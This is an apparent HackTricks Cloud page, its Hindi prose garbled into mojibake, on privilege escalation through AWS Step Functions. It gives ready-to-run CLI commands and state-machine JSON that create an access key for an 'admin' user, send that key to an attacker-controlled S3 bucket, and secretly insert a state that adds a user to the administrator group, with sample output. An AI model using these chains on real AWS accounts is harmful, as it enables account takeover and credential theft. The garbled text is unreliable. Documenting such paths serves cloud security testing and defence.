# AWS - рд╕реНрдЯреЗрдк рдлрдВрдХреНрд╢рдиреНрд╕ рдкреНрд░рд┐рд╡реЗрд╕реНрдХ

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## рд╕реНрдЯреЗрдк рдлрдВрдХреНрд╢рдиреНрд╕

рдЗрд╕ AWS рд╕реЗрд╡рд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП, рджреЗрдЦреЗрдВ:

{% content-ref url="../aws-services/aws-stepfunctions-enum.md" %}
[aws-stepfunctions-enum.md](../aws-services/aws-stepfunctions-enum.md)
{% endcontent-ref %}

### `states:TestState` рдФрд░ `iam:PassRole`

**`states:TestState`** рдФрд░ **`iam:PassRole`** рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХрд┐рд╕реА рднреА рд╕реНрдерд┐рддрд┐ рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрд╕реЗ рдХрд┐рд╕реА рднреА IAM рднреВрдорд┐рдХрд╛ рдХреЛ рдкрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдмрд┐рдирд╛ рдХрд┐рд╕реА рдореМрдЬреВрджрд╛ рд╕реНрдерд┐рддрд┐ рдорд╢реАрди рдХреЛ рдмрдирд╛рдП рдпрд╛ рдЕрдкрдбреЗрдЯ рдХрд┐рдП, рдЬрд┐рд╕рд╕реЗ рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдВрдЪ рджреВрд╕рд░реА AWS рд╕реЗрд╡рд╛рдУрдВ рддрдХ рднреВрдорд┐рдХрд╛рдУрдВ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рдеред рд╕рдВрднрд╛рд╡рдирд╛рддрдГред рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдорд┐рд▓рд╛рдХрд░, рдпрд╣ рдЕрдирдзрд┐рдХреГрдд рдХрд╛рд░реНрд░рд╡рд╛рдИ рдореЗрдВ рд▓реЗ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рд╕реЗ рдбреЗрдЯрд╛ рдХреЛ рдмрджрд▓рдиреЗ рддрдХ, рдбреЗрдЯрд╛ рдЙрд▓реНрд▓рдВрдШрди, рд╕рдВрд╕рд╛рдзрди рдореЗрдВ рд╣рд╕реНрддрдХреНрд╖реЗрдк рдФрд░ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдЙрдиреНрдирддрд┐ред
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
The following examples show how to test an state that creates an access key for the **`admin`** user leveraging these permissions and a permissive role of the AWS environment. This permissive role should have any high-privileged policy associated with it (for example **`arn:aws:iam::aws:policy/AdministratorAccess`**) that allows the state to perform the **`iam:CreateAccessKey`** action:

- **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
- **рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдЗрд╕реНрдХреЗрд▓реЗрд╢рди** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд╖реНрдкрд╛рджрд┐рдд **рдХрдорд╛рдВрдб**:
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
- **рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡**: рд╡рд┐рдирд╛рдореВрд▓реНрдп рд░реВрдк рд╕реЗ рдХрд╛рд░реНрдпрд╡рд╛рд╣реА рдФрд░ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХрд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рдг рдФрд░ рдкрд░реНрдпрд╛рдкреНрдд рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ, рдЬреЛ рд╕реБрд░рдХреНрд╖рд╛ рдЙрд▓реНрд▓рдВрдШрди рдореЗрдВ рдорд╣рддреНрд╡рдкреВрд░реНрдг рднрдВрдЧ рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрд╛рд╕ **`states:CreateStateMachine`** рдФрд░ **`iam:PassRole`** рд╣реЛрдиреЗ рдкрд░ рдПрдХ рд╕реНрдерд┐рддрд┐ рдорд╢реАрди рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрд╕реЗ рдХрд┐рд╕реА рднреА IAM рднреВрдорд┐рдХрд╛ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЙрд╕ рднреВрдорд┐рдХрд╛ рдХреА рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдВрдЪ рдЕрдиреНрдп AWS рд╕реЗрд╡рд╛рдУрдВ рддрдХ рд╕рдХреНрд╖рдо рд╣реЛ рдЬрд╛рддреА рд╣реИред рдкрд┐рдЫрд▓реА privesc рддрдХрдиреАрдХ рдХреЗ рд╡рд┐рдкрд░реАрдд (**`states:TestState`** & **`iam:PassRole`**), рдпрд╣ рдЕрдкрдиреЗ рдЖрдк рдореЗрдВ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ, рдЖрдкрдХреЛ рдЗрд╕рдХреЗ рд╕рд╛рде **`states:StartExecution`** рдпрд╛ **`states:StartSyncExecution`** рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП (**`states:StartSyncExecution`** **рдорд╛рдирдХ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рдирд╣реАрдВ рд╣реИ**, **рдХреЗрд╡рд▓ рд╕реНрдерд┐рддрд┐ рдорд╢реАрдиреНрд╕ рдХреЗ рд▓рд┐рдП**) рддрд╛рдХрд┐ рд╕реНрдерд┐рддрд┐ рдорд╢реАрди рдкрд░ рдПрдХ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рд╢реБрд░реВ рдХрд░ рд╕рдХреЗрдВред
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рджрд┐рдЦрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдХреИрд╕реЗ рдПрдХ рд╕реНрдЯреЗрдЯ рдорд╢реАрди рдмрдирд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИ рдЬреЛ **`admin`** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдПрдХреНрд╕реЗрд╕ рдХреБрдВрдЬреА рдмрдирд╛рддреА рд╣реИ рдФрд░ рдЗрд╕ рдПрдХреНрд╕реЗрд╕ рдХреБрдВрдЬреА рдХреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдпрдВрддреНрд░рд┐рдд S3 рдмрдХреЗрдЯ рдореЗрдВ рдирд┐рдХрд╛рд▓рддреА рд╣реИ, рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рддреА рд╣реИ рдФрд░ AWS рдкрд░реНрдпрд╛рд╡рд░рдг рдХреА рдПрдХ рдЕрдиреБрдорддрд┐рд╢реАрд▓ рднреВрдорд┐рдХрд╛ред рдЗрд╕ рдЕрдиреБрдорддрд┐рд╢реАрд▓ рднреВрдорд┐рдХрд╛ рдХреЗ рд╕рд╛рде рдХрд┐рд╕реА рднреА рдЙрдЪреНрдЪ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА рдиреАрддрд┐ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **`arn:aws:iam::aws:policy/AdministratorAccess`**) рдЬреЛ рд╕реНрдЯреЗрдЯ рдорд╢реАрди рдХреЛ **`iam:CreateAccessKey`** рдФрд░ **`s3:putObject`** рдХреНрд░рд┐рдпрд╛рдПрдБ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред

- **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
- **рд░рд╛рдЬреНрдп рдорд╢реАрди рдмрдирд╛рдиреЗ** рдХреЗ рд▓рд┐рдП **рдЖрджреЗрд╢** рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди:
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
- **рдЖрджреЗрд╢** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ **рдкрд╣рд▓реЗ рд╕реЗ рдмрдирд╛рдП рдЧрдП рд░рд╛рдЬреНрдп рдорд╢реАрди** рдХреА рдПрдХреНрдЬреАрдХреНрдпреВрд╢рди рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
{% hint style="warning" %}

рд╣рдорд▓рд╛рд╡рд╛рд░ рдирд┐рдпрдВрддреНрд░рдг рд╡рд╛рд▓реЗ S3 рдмрдХреЗрдЯ рдХреЛ рд╡рд┐рдХреНрдЯрд┐рдо рдЕрдХрд╛рдЙрдВрдЯ рд╕реЗ s3:PutObject рдХрд╛рд░реНрд░рд╡рд╛рдИ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред

{% endhint %}

- **рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡**: рд╡рд┐рдирд╛рдореВрд▓реНрдпрдХ рд╡реНрдпрд╛рд╡рд╣рд╛рд░рд┐рдХрд░рдг рдФрд░ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХрд╛ рдЙрд▓реНрд▓рдВрдШрди рдФрд░ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ, рдЬреЛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕реБрд░рдХреНрд╖рд╛ рдЙрд▓реНрд▓рдВрдШрдиреЛрдВ рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### `states:UpdateStateMachine` & (рд╣рдореЗрд╢рд╛ рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реИ) `iam:PassRole`

**`states:UpdateStateMachine`** рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓рд╛ рдПрдХ рд╣рдорд▓рд╛рд╡рд╛рд░ рдПрдХ рд░рд╛рдЬреНрдп рдорд╢реАрди рдХреА рдкрд░рд┐рднрд╛рд╖рд╛ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛, рдЕрддрд┐рд░рд┐рдХреНрдд рдЧреБрдкреНрдд рд░рд╛рдЬреНрдп рдЬреЛ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдпрди рдореЗрдВ рд╕рдорд╛рдкреНрдд рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рдПрдХ рд╡рд┐рдзрд┐ рдЙрдиреНрдирдпрди рдореЗрдВ рд╕рдорд╛рдкреНрдд рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдкреНрд░рдХрд╛рд░, рдЬрдм рдПрдХ рд╡реИрдз рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд░рд╛рдЬреНрдп рдорд╢реАрди рдХрд╛ рдПрдХреНрдЬреАрдХреНрдпреВрд╢рди рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдирдпрд╛ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдЧреБрдкреНрдд рд░рд╛рдЬреНрдп рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛ рдФрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдпрди рд╕рдлрд▓ рд╣реЛрдЧрд╛ред

рд░рд╛рдЬреНрдп рдорд╢реАрди рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд IAM рд░реЛрд▓ рдХрд┐рддрдирд╛ рдЕрдиреБрдорддрд┐рдкреВрд░реНрдг рд╣реИ, рдЗрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░реЗрдЧрд╛, рдПрдХ рд╣рдорд▓рд╛рд╡рд╛рд░ рдХреЛ 2 рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░рдирд╛ рдкрдбрд╝реЗрдЧрд╛:

1. **рдЕрдиреБрдорддрд┐рдкреВрд░реНрдг IAM рд░реЛрд▓**: рдпрджрд┐ рд░рд╛рдЬреНрдп рдорд╢реАрди рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд IAM рд░реЛрд▓ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЕрдиреБрдорддрд┐рдкреВрд░реНрдг рд╣реИ (рдЙрд╕рдореЗрдВ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **`arn:aws:iam::aws:policy/AdministratorAccess`** рдиреАрддрд┐ рдЬреБрдбрд╝реА рд╣реЛрддреА рд╣реИ), рддреЛ рддреЛ **`iam:PassRole`** рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрдЧреА рдЬрд┐рд╕рд╕реЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдпрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕реЗ IAM рд░реЛрд▓ рдХреЛ рднреА рдЕрдкрдбреЗрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрдЧреА, рд░рд╛рдЬреНрдп рдорд╢реАрди рдХреА рдкрд░рд┐рднрд╛рд╖рд╛ рд╣реА рдХрд╛рдлреА рд╣реЛрдЧреАред
2. **рдЕрдиреБрдорддрд┐рдкреВрд░реНрдг IAM рд░реЛрд▓**: рдкрд┐рдЫрд▓реЗ рдорд╛рдорд▓реЗ рдХреЗ рд╡рд┐рдкрд░реАрдд, рдпрд╣рд╛рдБ рдПрдХ рд╣рдорд▓рд╛рд╡рд╛рд░ рдХреЛ рд░рд╛рдЬреНрдп рдорд╢реАрди рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдПрдХ рдЕрдиреБрдорддрд┐рдкреВрд░реНрдг IAM рд░реЛрд▓ рдХреЛ рд╕рдВрдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **`iam:PassRole`** рдЕрдиреБрдорддрд┐ рднреА рдЖрд╡рд╢реНрдпрдХ рд╣реЛрдЧреА рдХреНрдпреЛрдВрдХрд┐ рд░рд╛рдЬреНрдп рдорд╢реАрди рдХреА рдкрд░рд┐рднрд╛рд╖рд╛ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд рдПрдХ рдЕрдиреБрдорддрд┐рдкреВрд░реНрдг IAM рд░реЛрд▓ рдХреЛ рд╕рдВрдмрдВрдзрд┐рдд рдХрд░рдирд╛ рднреА рдЖрд╡рд╢реНрдпрдХ рд╣реЛрдЧрд╛ред
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рджрд┐рдЦрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдХреИрд╕реЗ рдПрдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕реНрдерд┐рддрд┐ рдорд╢реАрди рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдП рдЬреЛ рдХреЗрд╡рд▓ рдПрдХ HelloWorld Lambda рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЖрдордВрддреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдПрдХ рдЕрддрд┐рд░рд┐рдХреНрдд рд╕реНрдерд┐рддрд┐ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **`unprivilegedUser`** рдХреЛ **`administrator`** IAM рд╕рдореВрд╣ рдореЗрдВ рдЬреЛрдбрд╝рддреА рд╣реИ, рдЬреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдПред рдЗрд╕ рддрд░рд╣, рдЬрдм рдПрдХ рд╡рд┐рдзрд┐рдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдкрдбреЗрдЯ рдХрд┐рдП рдЧрдП рд╕реНрдерд┐рддрд┐ рдорд╢реАрди рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдирдИ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдЫреБрдкрд╛ рд╣реБрдЖ рд╕реНрдерд┐рддрд┐ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ рд╕рдлрд▓ рд╣реЛрдЧреАред

{% hint style="warning" %}

рдпрджрд┐ рд╕реНрдерд┐рддрд┐ рдорд╢реАрди рдХреЗ рд╕рд╛рде рдХреЛрдИ рдЕрдиреБрдорддрд┐рдкреВрд░реНрд╡ IAM рднреВрдорд┐рдХрд╛ рд╕рдВрдмрдВрдзрд┐рдд рдирд╣реАрдВ рд╣реИ, рддреЛ рдЗрд╕реЗ рдЕрдкрдбреЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА **`iam:PassRole`** рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА рддрд╛рдХрд┐ рдПрдХ рдЕрдиреБрдорддрд┐рдкреВрд░реНрд╡ IAM рднреВрдорд┐рдХрд╛ рдХреЛ рд╕рдВрдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП IAM рднреВрдорд┐рдХрд╛ рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **`arn:aws:iam::aws:policy/AdministratorAccess`** рдиреАрддрд┐ рд╕рдВрд▓рдЧреНрди рд╣реИ)ред

{% endhint %}

{% tabs %}

{% tab title="рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕реНрдерд┐рддрд┐ рдорд╢реАрди" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% tab title="рдХреБрдЯрд┐рд▓ рдЕрдкрдбреЗрдЯреЗрдб рд╕реНрдЯреЗрдЯ рдорд╢реАрди" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% endtabs %}

- **рдЖрджреЗрд╢** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ **рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕реНрдерд┐рддрд┐ рдорд╢реАрди** рдХреЛ **рдЕрдкрдбреЗрдЯ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
- **рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡**: рд╡рд┐рдирд╛рдореВрд▓реНрдп рд░реВрдк рд╕реЗ рдХрд╛рд░реНрдпрд╡рд╛рд╣реА рдФрд░ рдкрд░рд┐рдкреНрд░реЗрдХреНрд╖реНрдп рд╡рд┐рдзрд┐рдпреЛрдВ рдХрд╛ рдЕрдирдзрд┐рдХреГрдд рдирд┐рд╖реНрдкрд╛рджрди рдФрд░ рдкрд░рд┐рд╡рд░реНрддрди, рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕реБрд░рдХреНрд╖рд╛ рдЙрд▓реНрд▓рдВрдШрди рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ред

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

рджреВрд╕рд░реЗ рддрд░реАрдХреЗ HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
